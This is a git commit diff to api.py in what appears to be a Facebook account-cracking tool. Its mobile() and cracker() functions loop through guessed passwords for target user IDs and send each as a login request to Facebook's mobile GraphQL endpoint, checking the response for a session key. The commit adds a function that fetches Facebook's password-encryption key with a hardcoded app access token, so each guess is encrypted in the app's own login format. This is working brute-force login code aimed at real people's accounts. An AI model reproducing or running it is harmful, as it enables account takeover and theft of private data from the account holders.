98df46d08dbe0ad913decdc9b00cfb1333137a17
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-10-18 23:00:51 +0530

    Update api.py

--- api.py
+++ api.py
@@ -49,6 +49,10 @@ from bs4 import BeautifulSoup
 import requests as ress
 from sys import exit as exit
 from io import BytesIO
+import requests, base64, struct, io, time
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES, PKCS1_v1_5
+from Crypto.Random import get_random_bytes
 #print("WAIT INSTALLING MODULES")
 #os.system("pip install bs4")
 #os.system("pip install requests")
@@ -1638,19 +1642,36 @@ def mobile(uid,pwx,tl):
     try:
         for pw in pwx:
             data = {
-            'method': 'post',
-            'pretty': False,
-            'format': 'json',
-            'server_timestamps': True,
-            'locale': 'id_ID, en-US',
-            'purpose': 'fetch',
-            'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-            'fb_api_caller_class': 'graphservice',
-            'client_doc_id': '119940804214876861379510865434',
-            'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"'"+str(uuid.uuid4)+"'\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+pw+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"'"+str(uuid.uuid4())+"'\\\",\\\"waterfall_id\\\":\\\"'"+str(uuid.uuid4())+"'\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"'"+str(uuid.uuid4)+"'\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
-            'fb_api_analytics_tags': '["GraphServices"]',
-            'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'
-            }
+    'method': 'post',
+    'pretty': False,
+    'format': 'json',
+    'server_timestamps': True,
+    'locale': 'id_ID, en-US',
+    'purpose': 'fetch',
+    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+    'fb_api_caller_class': 'graphservice',
+    'client_doc_id': '119940804214876861379510865434',
+    'variables': json.dumps({
+        "params": {
+            "params": "{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\"" + uid + "\\\",\\\"encrypted_password\\\":\\\"" + PWD_FB4A(pw) + "\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"waterfall_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}",
+        "bloks_versioning_id": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5",
+        "app_id": "com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"
+    },
+    "scale": "2",
+    "nt_context": {
+        "using_white_navbar": True,
+        "styles_id": "cfe75e13b386d5c54b1de2dcca1bee5a",
+        "pixel_ratio": 2,
+        "is_push_on": False,
+        "debug_tooling_metadata_token": None,
+        "is_flipper_enabled": False,
+        "theme_params": [],
+        "bloks_version": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"
+    }
+    }),
+    'fb_api_analytics_tags': '["GraphServices"]',
+    'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'
+}
             headers = {
             'host': 'b-graph.facebook.com',
             'x-fb-connection-type': 'MOBILE.LTE',
@@ -1669,8 +1690,7 @@ def mobile(uid,pwx,tl):
             'x-requested-with': 'XMLHttpCanary',
             'x-fb-http-engine': 'Tigon/Liger',
             'x-fb-client-ip': 'True',
-            'x-fb-server-cluster': 'True',
-            }
+            'x-fb-server-cluster': 'True',}
             url = "https://b-graph.facebook.com/graphql"
             result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
@@ -2296,48 +2316,39 @@ def cracker(uid, pwx, tl):
         #print({error})
         pass
 
-class Encrypt_PWD:
-    def __init__(self) -> None:
-        pass
-        
-    def PWD_FB4A(self, password, public_key=None, key_id="25"):
-        if public_key is None:
-            try:
-                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
-                pwd_key_fetch_data = {
-                    'version': '2',
-                    'flow': 'CONTROLLER_INITIALIZATION',
-                    'method': 'GET',
-                    'fb_api_req_friendly_name': 'pwdKeyFetch',
-                    'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
-                    'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
-                }
-                response = requests.post(pwd_key_fetch, params=pwd_key_fetch_data).json()
-                public_key = response.get('public_key')
-                key_id = str(response.get('key_id', key_id))
-            except Exception as e:
-                return (f"API: {str(e).title()}")
-        try:
-            rand_key = get_random_bytes(32) 
-            iv = get_random_bytes(12)
-            pubkey = RSA.import_key(public_key)
-            cipher_rsa = PKCS1_v1_5.new(pubkey)
-            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
-            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
-            current_time = int(time.time())
-            cipher_aes.update(str(current_time).encode("utf-8"))
-            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
-            buf = io.BytesIO()
-            buf.write(bytes([1, int(key_id)]))
-            buf.write(iv)
-            buf.write(struct.pack("<h", len(encrypted_rand_key)))
-            buf.write(encrypted_rand_key)
-            buf.write(auth_tag) 
-            buf.write(encrypted_passwd)
-            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
-            return f"#PWD_FB4A:2:{current_time}:{encoded}"
-        except (Exception) as e:
-            return(f"{str(e).title()}")
+def PWD_FB4A(password, public_key=None, key_id="25"):
+    if public_key is None:
+        pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
+        pwd_key_fetch_data = {
+            'version': '2',
+            'flow': 'CONTROLLER_INITIALIZATION',
+            'method': 'GET',
+            'fb_api_req_friendly_name': 'pwdKeyFetch',
+            'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
+            'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
+        }
+        response = requests.post(pwd_key_fetch, params=pwd_key_fetch_data).json()
+        public_key = response.get('public_key')
+        key_id = str(response.get('key_id', key_id))
+
+    rand_key = get_random_bytes(32)
+    iv = get_random_bytes(12)
+    pubkey = RSA.import_key(public_key)
+    cipher_rsa = PKCS1_v1_5.new(pubkey)
+    encrypted_rand_key = cipher_rsa.encrypt(rand_key)
+    cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
+    current_time = int(time.time())
+    cipher_aes.update(str(current_time).encode("utf-8"))
+    encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
+    buf = io.BytesIO()
+    buf.write(bytes([1, int(key_id)]))
+    buf.write(iv)
+    buf.write(struct.pack("<h", len(encrypted_rand_key)))
+    buf.write(encrypted_rand_key)
+    buf.write(auth_tag)
+    buf.write(encrypted_passwd)
+    encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
+    return f"#PWD_FB4A:2:{current_time}:{encoded}"
 
 os.system("clear")
 Process()
